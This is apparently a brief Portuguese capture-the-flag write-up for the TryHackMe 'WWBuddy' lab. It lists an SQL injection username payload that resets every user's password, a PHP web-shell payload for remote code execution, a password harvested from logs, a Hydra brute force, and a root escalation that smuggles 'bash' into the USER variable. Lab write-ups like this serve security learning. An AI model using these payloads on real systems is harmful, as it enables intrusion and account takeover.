Enumeração dos serviços:
![[Write-up/Try Hack Me/WWBuddy/img/Pasted image 20240130090445.png]]

Criação de uma conta com payload SQLi:
`teste' OR 1=1#`
Resete de senha, dessa forma reseta a senha de todos os usuários.
Login na conta wwbuddy
Descoberta de novos usuários: henry e roberto
Login na conta henry e acesso ao diretório /admin.
Alteração do usuário teste para o payload:
`<?php systeMm($_GET['cmd']);?>`
Acesse a página de admin, depois desloga e entra novamente com a conta henry. Agora temos um RCE em /admin.
Shell Reversa.
Análise dos logs em busca de senhas: 
`roberto:yVnocsXsf%X68wf`
Leitura do arquivo important.txt e montagem da wordlist com as possíveis datas de nascimento da usuária jenny.
Brute force com hydra:
`jenny:08/03/1994`
Desocerta de SUID.
Baixa o binário para ser analisado com o `ghidra`
Altera a variável USER para executar o bash do root: `export USER="jenny;bash"`


